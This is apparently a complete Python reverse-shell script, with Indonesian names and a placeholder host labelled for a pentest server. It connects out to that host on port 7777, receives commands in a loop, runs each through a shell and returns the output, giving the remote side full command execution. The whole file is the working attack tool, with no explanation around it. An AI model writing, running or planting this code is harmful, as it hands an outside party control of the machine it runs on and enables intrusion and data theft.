import socket
import subprocess
from subprocess import PIPE

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
port=7777
host='diisi-IP-ServerPentest'
sock.connect((host,port))

def terima_perintah():
    while True:
        data=sock.recv(1024).decode('utf-8').rstrip()
        pros= subprocess.run(data,shell=True,capture_output=True)       
        output= pros.stdout.decode('utf-8')        
        sock.send(output.encode('utf-8'))
        

terima_perintah()
       
